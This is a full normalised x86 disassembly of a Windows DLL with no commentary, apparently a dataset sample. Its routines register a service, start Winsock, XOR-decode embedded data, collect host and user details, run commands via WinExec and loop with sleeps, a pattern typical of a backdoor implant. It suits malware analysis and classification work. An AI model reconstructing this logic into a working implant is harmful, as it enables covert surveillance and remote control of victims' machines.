mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x324 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x11c ]
push eax
push [ ebp - 0x220 ]
push ebx
call [ LookupAccountSidA@IAT ]
lea eax [ ebp - 0x11c ]
push eax
call sub_10005905
lea eax [ ebp - 0x11c ]
mov [ esp ] r--data
push eax
call sub_10005b50
pop ecx
pop ecx
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
push edi
call esi
mov [ ebp - 0x1 ] 0x1
sub_100021ec
mov eax [ esi ]
mov ecx [ eax ]
mov [ eax ] eax
mov eax [ esi ]
mov [ eax + 0x4 ] eax
and [ esi + 0x4 ] 0x0
cmp ecx [ esi ]
je r-xdata
push [ esi ]
call sub_10005185
pop ecx
retn
push edi
mov edi [ ecx ]
push ecx
call sub_10005185
pop ecx
mov ecx edi
cmp edi [ esi ]
jne r-xdata
pop edi
sub_10002219
push ebp
mov ebp esp
sub esp 0x10
push 0xc
call sub_10005190
pop ecx
test eax eax
jne r-xdata
leave
retn
and [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_100055f9
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10007be4
sub_1000226c
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push ebx
push esi
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
lea esi [ ecx - 0x1 ]
push esi
push edi
xor ebx ebx
call sub_10006367
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
mov [ esi + edi ] bl
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop esi
mov eax ebx
pop ebx
mov [ esi + edi ] bl
jmp r-xdata
sub_100022bb
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
dec ecx
mov eax 0x8007007a
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi edx
sub esi ecx
pop edi
pop esi
test ebx ebx
jne r-xdata
mov dl [ esi + ecx ]
test dl dl
je r-xdata
mov [ ecx ] 0x0
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dl
inc ecx
dec edi
dec ebx
jne r-xdata
test edi edi
je r-xdata
sub_100022f6
push ebp
mov ebp esp
sub esp 0x190
push ebx
push esi
mov esi edi
call sub_100012f2
lea esi [ edi + 0x1120 ]
call sub_100012f2
push 0x10d0
xor ebx ebx
lea eax [ edi + 0x2240 ]
push ebx
push eax
call sub_10005100
push 0x28
call sub_10005190
add esp 0x10
cmp eax ebx
je r-xdata
xor eax eax
call sub_10001000
jmp r-xdata
pop esi
mov eax edi
pop ebx
leave
retn
call [ WSAGetLastError@IAT ]
mov esi 0x800
push esi
mov [ edi + 0x3310 ] eax
mov [ edi + 0x3314 ] ebx
mov [ edi + 0x3320 ] ebx
mov [ edi + 0x3318 ] ebx
mov [ edi + 0x331c ] ebx
call sub_10005190
push esi
push ebx
push eax
mov [ edi + 0x332c ] eax
mov [ edi + 0x3330 ] ebx
call sub_10005100
add esp 0x10
lea eax [ ebp - 0x190 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
sub_100023a0
push esi
push edi
mov edi [ ebx + 0x3310 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x332c ]
test eax eax
je r-xdata
call sub_10001014
push edi
call sub_10005185
and [ ebx + 0x3310 ] 0x0
pop ecx
mov eax [ ebx + 0x3330 ]
test eax eax
je r-xdata
push eax
call sub_10005185
and [ ebx + 0x332c ] 0x0
pop ecx
call [ WSACleanup@IAT ]
lea eax [ ebx + 0x1120 ]
call sub_100013f1
pop edi
mov eax ebx
pop esi
jmp sub_100013f1
push eax
call [ CloseHandle@IAT ]
and [ ebx + 0x3330 ] 0x0
sub_10002409
push ebp
mov ebp esp
sub esp 0x200
push ebx
push esi
push edi
jmp r-xdata
xor eax eax
push 0x1fc
push eax
mov [ ebp - 0x200 ] ax
lea eax [ ebp - 0x1fe ]
push eax
call sub_10005100
add esp 0xc
push 0xff
lea eax [ ebp - 0x200 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
push r--data
lea eax [ ebp - 0x200 ]
push eax
call [ PathAppendW@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_100024b8
push ebx
push esi
push edi
mov esi eax
call [ GetTickCount@IAT ]
push eax
call sub_10005bd8
pop ecx
mov ecx esi
call sub_10002409
call sub_10002544
test al al
je r-xdata
pop edi
pop esi
xor al al
pop ebx
retn
push 0xd70
push rw-data
push rw-data
call sub_10005210
mov edi [ Sleep@IAT ]
add esp 0xc
mov eax esi
call sub_100028c0
test al al
jne r-xdata
push esi
call sub_100028eb
jmp r-xdata
mov eax [ rw-data ]
imul eax eax 0x3e8
push eax
call edi
mov eax ebx
inc ebx
cmp eax [ esi + 0x3320 ]
jb r-xdata
xor ebx ebx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
imul eax eax 0x3e8
push eax
call edi
jmp r-xdata
sub_10002544
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
lea edi [ esi + 0x3318 ]
mov eax [ edi ]
or eax [ edi + 0x4 ]
jne r-xdata
mov ebx [ esi + 0x3310 ]
call sub_10001040
test al al
je r-xdata
call sub_10003c37
mov ebx [ GetTickCount@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
leave
retn
cmp [ esi + 0x3314 ] 0x0
jne r-xdata
call ebx
mov [ ebp - 0x4 ] eax
shl [ ebp - 0x4 ] 0x8
call ebx
add eax [ ebp - 0x4 ]
and [ edi + 0x4 ] 0x0
mov [ edi ] eax
mov eax [ edi ]
or eax [ edi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x3310 ]
mov eax edx
call sub_1000118e
mov [ esi + 0x3320 ] eax
test eax eax
jne r-xdata
call sub_10004d81
mov [ esi + 0x3314 ] eax
call ebx
add [ edi ] eax
adc [ edi + 0x4 ] 0x0
mov eax edx
call sub_10001196
mov [ esi + 0x3324 ] eax
mov eax edx
call sub_1000119a
mov ebx esi
mov [ esi + 0x3328 ] eax
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
call sub_10002618
mov ecx esi
call sub_100029bc
mov [ esi + 0x3320 ] 0x4
sub_10002618
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebx + 0x3310 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] esi
call sub_100011a2
push eax
call sub_10006230
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x3310 ]
mov [ ebp - 0x4 ] esi
call sub_1000119e
push eax
call sub_10006230
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x3310 ]
call sub_100011a2
push eax
call sub_100044d1
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x3310 ]
mov [ ebp - 0x8 ] esi
call sub_100011e3
push eax
call sub_10006230
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x3310 ]
call sub_1000119e
push eax
call sub_100044d1
pop ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x3310 ]
mov [ ebp - 0xc ] esi
call sub_100011ee
push eax
call sub_10006230
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x3310 ]
call sub_100011e3
push eax
call sub_100044d1
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x3310 ]
mov [ ebp - 0x10 ] esi
call sub_100011f9
push eax
call sub_10006230
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x3310 ]
call sub_100011ee
push eax
call sub_100044d1
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x3310 ]
mov [ ebp - 0x14 ] esi
call sub_10001184
push eax
call sub_10006230
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x3310 ]
call sub_100011f9
push eax
call sub_100044d1
pop ecx
mov [ ebp - 0x10 ] eax
push r--data
mov esi ebx
call sub_1000144b
push [ ebx + 0x331c ]
mov eax ebx
push [ ebx + 0x3318 ]
call sub_100015d2
push [ ebp - 0x4 ]
call sub_1000156a
push [ ebp - 0x18 ]
mov eax ebx
call sub_1000159e
push [ ebp - 0x8 ]
mov ecx ebx
call sub_100015eb
push [ ebp - 0xc ]
mov ecx ebx
call sub_10001624
push [ ebp - 0x10 ]
mov ecx ebx
call sub_10001658
push [ ebp - 0x14 ]
mov edi ebx
call sub_1000148e
lea edi [ ebx + 0x1120 ]
push r--data
mov esi edi
call sub_1000144b
push [ ebp - 0x4 ]
mov eax edi
call sub_1000156a
push [ ebx + 0x331c ]
mov eax edi
push [ ebx + 0x3318 ]
call sub_100015d2
mov esi [ ebp - 0x18 ]
push esi
call sub_1000159e
push [ ebp - 0x8 ]
mov ecx edi
call sub_100015eb
push [ ebp - 0xc ]
mov ecx edi
call sub_10001624
push [ ebp - 0x10 ]
mov ecx edi
call sub_10001658
push [ ebp - 0x14 ]
call sub_1000148e
mov eax [ ebx + 0x3318 ]
mov [ ebx + 0x2240 ] eax
mov eax [ ebx + 0x331c ]
mov [ ebx + 0x2244 ] eax
mov edi 0x1fe
test esi esi
je r-xdata
mov eax [ ebx + 0x3310 ]
call sub_10001184
push eax
call sub_100044d1
pop ecx
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
push edi
lea ecx [ ebx + 0x2b10 ]
call sub_10001234
push esi
call sub_1000517a
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
lea ecx [ ebx + 0x2f10 ]
push edi
call sub_10001234
push [ ebp - 0x4 ]
call sub_1000517a
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
push [ ebp - 0x8 ]
lea ecx [ ebx + 0x2648 ]
push edi
call sub_10001234
push [ ebp - 0x8 ]
call sub_1000517a
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push [ ebp - 0xc ]
lea ecx [ ebx + 0x2a48 ]
push 0x32
call sub_10001234
push [ ebp - 0xc ]
call sub_1000517a
pop ecx
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push [ ebp - 0x10 ]
lea ecx [ ebx + 0x2aac ]
push 0x32
call sub_10001234
push [ ebp - 0x10 ]
call sub_1000517a
pop ecx
pop edi
mov al 0x1
pop esi
leave
retn
push [ ebp - 0x14 ]
lea ecx [ ebx + 0x2248 ]
push edi
call sub_10001234
push [ ebp - 0x14 ]
call sub_1000517a
pop ecx
sub_100028c0
push ecx
push ebx
push esi
push [ rw-data ]
mov esi eax
call sub_10001782
mov bl al
test bl bl
je r-xdata
mov eax esi
call sub_10001420
pop esi
mov al bl
pop ebx
pop ecx
retn
push esi
call sub_10001828
mov bl al
sub_100028eb
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0xc ] 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10002c5e
test al al
je r-xdata
xor bl bl
mov eax esi
call sub_10001420
push [ rw-data ]
call sub_10001782
test al al
je r-xdata
push esi
call sub_10001828
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax esi
call sub_10001850
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_1000415c
pop ecx
test al al
je r-xdata
mov edi [ ebp - 0xc ]
mov eax [ edi + 0x9 ]
mov ecx eax
shr ecx 0xb
test cl 0x1f
jne r-xdata
cmp al 0x5
jne r-xdata
mov esi [ edi + 0xe ]
lea eax [ esi + 0x1 ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ edi + 0xe ]
inc eax
push eax
push 0x0
push ebx
call sub_10005100
mov eax [ ebp - 0xc ]
add esp 0xc
push esi
add eax 0x12
push eax
push ebx
call sub_10005210
add esp 0xc
push ebx
push [ ebp + 0x8 ]
call sub_10002cd2
mov bl al
jmp r-xdata
mov eax [ ebp + 0x8 ]
call sub_10001420
pop edi
pop esi
mov al bl
pop ebx
leave
retn 0x4
sub_100029bc
push ebp
mov ebp esp
sub esp 0x1ec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x332c ]
xor edi edi
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] edi
jmp r-xdata
push 0x800
push eax
call [ IsBadWritePtr@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
pop edi
pop esi
setne al
pop ebx
leave
retn
mov eax [ ebx + 0x332c ]
mov [ eax + 0x400 ] 0x50
mov eax [ ebx + 0x3310 ]
cmp eax edi
je r-xdata
push 0x28
push eax
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x3310 ]
call sub_10001184
push eax
call sub_100044d1
mov esi eax
pop ecx
cmp esi edi
je r-xdata
mov eax [ ebx + 0x3310 ]
call sub_10001192
mov ecx [ ebx + 0x332c ]
mov [ ecx + 0x404 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x332c ]
add eax 0x410
mov esi 0x80
push eax
mov [ ebp - 0x8 ] esi
call [ GetComputerNameW@IAT ]
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x332c ]
add eax 0x510
push eax
mov [ ebp - 0x8 ] esi
call [ GetUserNameW@IAT ]
mov esi [ ebx + 0x332c ]
add esi 0x610
call sub_10004dd6
mov ecx [ ebx + 0x332c ]
mov [ ecx + 0x660 ] eax
lea eax [ ebp - 0xe8 ]
push eax
mov [ ebp - 0xe8 ] 0x9c
call [ GetVersionExA@IAT ]
mov eax [ ebx + 0x332c ]
mov ecx [ ebp - 0xdc ]
mov [ eax + 0x664 ] ecx
mov eax [ ebx + 0x332c ]
mov cl [ ebp - 0x4e ]
push rw-data
push r--data
mov [ eax + 0x668 ] cl
mov [ ebp - 0x4 ] edi
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi edi
je r-xdata
push esi
call sub_10005a5f
pop ecx
test eax eax
je r-xdata
mov ecx [ ebx + 0x332c ]
xor eax eax
cmp [ ebp - 0x4 ] edi
mov esi r--data
setne al
push 0xfc
push 0x0
mov [ ecx + 0x408 ] eax
mov eax [ ebx + 0x332c ]
mov [ eax + 0x40c ] edi
lea edi [ ebp - 0x1e8 ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x1e5 ]
push eax
movsb [ edi ] [ esi ]
call sub_10005100
add esp 0xc
push 0xff
lea eax [ ebp - 0x1e8 ]
push eax
push 0xb
push 0x800
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call esi
test eax eax
jne r-xdata
push esi
call sub_1000517a
pop ecx
mov ecx [ ebx + 0x332c ]
push esi
push 0x200
call sub_10001234
push 0x40
pop esi
push esi
lea eax [ ebp - 0x48 ]
push 0x0
push eax
call sub_10005100
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x48 ] esi
call [ GlobalMemoryStatusEx@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x1e8 ]
push eax
call sub_10005a54
pop ecx
mov ecx [ ebx + 0x332c ]
mov [ ecx + 0x66c ] eax
mov [ ebp - 0x4 ] edi
mov eax [ ebx + 0x332c ]
mov edi 0x678
add eax edi
push eax
call sub_100030af
mov esi [ ebx + 0x332c ]
pop ecx
add esi edi
call sub_10003034
mov esi [ GetSystemMetrics@IAT ]
push 0x0
call esi
mov ecx [ ebx + 0x332c ]
xor edi edi
inc edi
push edi
mov [ ecx + 0x7f8 ] eax
call esi
mov ecx [ ebx + 0x332c ]
mov [ ecx + 0x7fc ] eax
mov ecx [ ebp - 0x40 ]
mov eax [ ebx + 0x332c ]
mov [ eax + 0x670 ] ecx
mov ecx [ ebp - 0x3c ]
mov [ eax + 0x674 ] ecx
sub_10002c5e
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
push [ edi + 0x332c ]
mov [ ebp - 0x1 ] 0x0
call sub_100040b2
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
lea eax [ edi + 0x1120 ]
call sub_10001420
test ebx ebx
je r-xdata
lea esi [ edi + 0x1120 ]
push ebx
call sub_1000168c
mov [ ebp - 0x1 ] al
test al al
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx ]
mov esi [ HeapFree@IAT ]
mov edi [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
push esi
call sub_10001828
mov [ ebp - 0x1 ] al
push ebx
push 0x0
call edi
push eax
call esi
push eax
push 0x0
call edi
push eax
call esi
sub_10002cd2
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
call sub_10004bf1
pop ecx
test eax eax
je r-xdata
xor al al
leave
retn 0x8
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
je r-xdata
xor esi esi
mov esi [ eax + 0x78 ]
add esi ecx
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add edi 0x2240
push edi
call esi
pop ecx
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
and [ ebp + 0xc ] 0x0
add edi ecx
add ebx ecx
test eax eax
jne r-xdata
mov eax [ edi ]
add eax ecx
push eax
push rw-data
call sub_1000f068
pop ecx
pop ecx
test eax eax
je r-xdata
movzx eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
inc [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
add edi 0x4
add ebx 0x2
cmp eax [ esi + 0x18 ]
jb r-xdata
cmp eax [ esi + 0x14 ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x1c ]
lea ecx [ ecx + eax * 4 ]
mov eax [ ebp - 0x4 ]
mov esi [ ecx + eax ]
add esi eax
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_10001420
lea eax [ edi + 0x1120 ]
call sub_10001420
test esi esi
je r-xdata
sub_10002d8e
push ebp
mov ebp esp
sub esp 0x64c
push ebx
push esi
push edi
push 0xfe
lea eax [ ebp - 0x14b ]
push 0x0
push eax
mov [ ebp - 0x14c ] 0x0
call sub_10005100
push 0xa
pop edi
lea ebx [ ebp - 0x14c ]
call sub_10004074
push 0x9
pop ecx
push 0x8
mov esi r--data
lea edi [ ebp - 0x4c ]
[ edi ] [ esi ]
pop ecx
mov esi r--data
lea edi [ ebp - 0x28 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi 0xfe
xor ebx ebx
push edi
lea eax [ ebp - 0x24b ]
push ebx
push eax
mov [ ebp - 0x24c ] bl
call sub_10005100
push edi
lea eax [ ebp - 0x34b ]
push ebx
push eax
mov [ ebp - 0x34c ] bl
call sub_10005100
push edi
lea eax [ ebp - 0x44b ]
push ebx
push eax
mov [ ebp - 0x44c ] bl
call sub_10005100
add esp 0x30
lea esi [ edi + 0x1 ]
push esi
lea eax [ ebp - 0x44c ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x24c ]
lea ecx [ ebp - 0x44c ]
mov edx eax
mov [ ebp - 0x4 ] esi
sub ecx edx
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov dl [ ecx + eax ]
cmp dl bl
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x34c ]
lea ecx [ ebp - 0x44c ]
mov edx eax
mov [ ebp - 0x4 ] esi
sub ecx edx
dec eax
mov [ eax ] dl
inc eax
dec [ ebp - 0x4 ]
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov dl [ ecx + eax ]
cmp dl bl
je r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x7ffffeff
je r-xdata
mov [ eax ] bl
push r--data
lea eax [ ebp - 0x24c ]
push eax
call [ PathAppendA@IAT ]
push r--data
lea eax [ ebp - 0x34c ]
push eax
call [ PathAppendA@IAT ]
mov edx esi
lea eax [ ebp - 0x14c ]
dec eax
mov [ eax ] dl
inc eax
dec [ ebp - 0x4 ]
jne r-xdata
cmp edx ebx
je r-xdata
inc eax
dec edx
jne r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x7ffffeff
je r-xdata
xor al al
jmp r-xdata
mov ecx esi
sub ecx edx
mov eax esi
sub eax ecx
push r--data
lea ecx [ ebp + ecx - 0x14c ]
mov edx 0x7fffffff
call sub_100022bb
cmp eax ebx
jl r-xdata
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x24c ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x34c ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
test al 0x10
je r-xdata
test al 0x10
je r-xdata
lea eax [ ebp - 0x24c ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x14c ]
push r--data
push eax
call sub_10005b36
pop ecx
pop ecx
cmp eax ebx
je r-xdata
test al 0x10
jne r-xdata
push 0x100
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
push 0xf
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
push edi
lea eax [ ebp - 0x54b ]
push ebx
push eax
mov [ ebp - 0x54c ] bl
call sub_10005100
add esp 0xc
push esi
lea eax [ ebp - 0x54c ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
push ebx
lea eax [ ebp - 0x54c ]
push eax
push 0x5
push 0x4
call [ SHChangeNotify@IAT ]
push ebx
lea eax [ ebp - 0x14c ]
push eax
push 0x5
push 0x4
call [ SHChangeNotify@IAT ]
push edi
lea eax [ ebp - 0x64b ]
push ebx
push eax
mov [ ebp - 0x64c ] bl
call sub_10005100
push r--data
lea eax [ ebp - 0x14c ]
push eax
push r--data
mov ecx esi
lea edi [ ebp - 0x64c ]
call sub_1000226c
add esp 0x18
push ebx
mov eax edi
push eax
call [ WinExec@IAT ]
mov al 0x1
push eax
lea eax [ ebp - 0x28 ]
lea eax [ ebp - 0x14c ]
push r--data
push eax
call sub_10005b36
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push eax
lea eax [ ebp - 0x4c ]
jmp r-xdata
push eax
call sub_100048da
pop ecx
pop ecx
sub_10003034
movzx eax [ esi ]
push edi
mov edi esi
jmp r-xdata
push eax
call sub_10006201
pop ecx
test eax eax
jne r-xdata
add edi 0x2
movzx eax [ edi ]
push esi
push edi
call sub_10005c0b
pop ecx
pop ecx
test eax eax
je r-xdata
pop edi
retn
push esi
call sub_10005a5f
mov ecx edi
sub ecx esi
sar ecx 0x1
sub eax ecx
movzx eax ax
lea eax [ eax + eax + 0x2 ]
push eax
push edi
push esi
call sub_10005dd0
add esp 0x10
sub_1000307c
push 0xc
pop edx
add ecx 0x4
add eax 0x2
push esi
movzx esi [ eax - 0x2 ]
mov [ ecx - 0x4 ] si
movzx esi [ eax - 0x1 ]
mov [ ecx - 0x2 ] si
movzx esi [ eax ]
mov [ ecx ] si
movzx esi [ eax + 0x1 ]
mov [ ecx + 0x2 ] si
add eax 0x4
add ecx 0x8
dec edx
jne r-xdata
pop esi
retn
sub_100030af
push ebp
mov ebp esp
sub esp 0x30
and [ ebp - 0x30 ] 0x0
push ebx
push esi
push 0x2c
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_10005100
xor ecx ecx
mov eax 0x80000002
cpuid
lea esi [ ebp - 0x30 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
xor ecx ecx
mov eax 0x80000003
cpuid
lea esi [ ebp - 0x20 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
xor ecx ecx
mov eax 0x80000004
cpuid
lea esi [ ebp - 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
mov esi [ ebp + 0x8 ]
add esp 0xc
mov ecx esi
lea eax [ ebp - 0x30 ]
call sub_1000307c
xor eax eax
mov [ esi + 0x60 ] ax
pop esi
pop ebx
leave
retn
sub_10003127
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
xor eax eax
inc eax
pop ebp
retn 0xc
push esi
push edi
push 0x8007
call [ SetErrorMode@IAT ]
mov esi [ ebp + 0x8 ]
and [ rw-data ] 0x0
mov [ rw-data ] esi
xor eax eax
xor [ eax + rw-data ] 0x75
inc eax
cmp eax 0x843
jl r-xdata
call sub_100039a4
call [ GetTickCount@IAT ]
push eax
call sub_10005bd8
pop ecx
push 0x0
call [ SetLastError@IAT ]
push esi
call [ DisableThreadLibraryCalls@IAT ]
mov edi 0xff
push edi
push rw-data
mov [ rw-data ] esi
push esi
mov esi [ GetModuleFileNameA@IAT ]
call esi
push edi
mov edi rw-data
push edi
push 0x0
call esi
push edi
call sub_10005905
pop ecx
pop edi
pop esi
sub_100031b4
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x445c
call sub_1000c6e0
push ebx
push esi
push edi
mov ecx rw-data
mov eax rw-data
mov edi ecx
mov esi 0x200
sub edi eax
mov [ esp + 0xc ] esi
xor ebx ebx
cmp [ esp + 0xc ] ebx
jne r-xdata
mov dl [ edi + eax ]
cmp dl bl
je r-xdata
push ecx
mov [ eax ] bl
call sub_10006230
pop ecx
mov ecx rw-data
mov [ rw-data ] ax
mov eax rw-data
mov edi ecx
sub edi eax
dec eax
mov [ eax ] dl
inc eax
dec [ esp + 0xc ]
jne r-xdata
cmp esi ebx
jne r-xdata
mov dl [ edi + eax ]
cmp dl bl
je r-xdata
mov edx [ esp + 0xc ]
add edx 0x7ffffdfe
je r-xdata
push ecx
mov [ eax ] bl
call sub_10006230
mov [ rw-data ] ax
mov eax 0xb4
pop ecx
lea esi [ esp + 0x10 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_100012f2
push rw-data
call sub_100044d1
mov esi eax
mov [ esp ] rw-data
call sub_100044d1
pop ecx
mov [ esp + 0xc ] eax
cmp esi ebx
je r-xdata
dec eax
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
lea eax [ esp + 0x10 ]
call sub_100013f1
lea edi [ esp + 0x1130 ]
call sub_100022f6
jmp r-xdata
cmp eax ebx
je r-xdata
lea edx [ esi + 0x7ffffdfe ]
test edx edx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
push esi
lea edi [ esp + 0x14 ]
call sub_1000148e
push r--data
mov eax edi
call sub_1000156a
push r--data
mov eax edi
call sub_1000159e
xor esi esi
lea eax [ esp + 0x1130 ]
push eax
call sub_10002489
lea ebx [ esp + 0x1130 ]
call sub_100023a0
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ esp + 0x10 ]
call sub_10001420
inc esi
cmp esi 0x5
jl r-xdata
push ebx
push ebx
push [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
call sub_10001f81
test al al
jne r-xdata
ServiceMain
push ebx
push esi
push edi
push 0x4e20
call [ Sleep@IAT ]
mov edx r--data
mov eax rw-data
mov esi edx
sub esi eax
mov edi 0xff
xor ebx ebx
cmp edi ebx
jne r-xdata
mov cl [ esi + eax ]
cmp cl bl
je r-xdata
push sub_10003485
push edx
mov [ eax ] bl
call [ RegisterServiceCtrlHandlerA@IAT ]
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
dec eax
mov [ eax ] cl
inc eax
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push 0x2
mov ecx 0xbb8
pop eax
mov [ rw-data ] 0x30
mov [ rw-data ] 0x3
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call sub_10003419
call sub_100033ab
lea ecx [ edi + 0x7ffffeff ]
test ecx ecx
je r-xdata
sub_100033ab
push esi
xor esi esi
push esi
push esi
push 0x1
push esi
call [ CreateEventW@IAT ]
xor ecx ecx
mov [ rw-data ] eax
cmp eax esi
jne r-xdata
push 0x4
pop eax
call sub_10003419
cmp [ rw-data ] esi
jne r-xdata
xor eax eax
inc eax
pop esi
jmp sub_10003419
mov esi [ WaitForSingleObject@IAT ]
push 0x1388
push [ rw-data ]
call esi
test eax eax
jne r-xdata
push esi
push esi
push esi
push sub_100031b4
push esi
push esi
call [ CreateThread@IAT ]
mov [ rw-data ] eax
push 0xffffffff
push [ rw-data ]
call esi
jmp r-xdata
xor ecx ecx
jmp r-xdata
sub_10003419
xor edx edx
mov [ rw-data ] 0x10
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ rw-data ] ecx
mov [ rw-data ] edx
cmp eax 0x2
jne r-xdata
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
cmp eax 0x4
je r-xdata
mov [ rw-data ] edx
jmp r-xdata
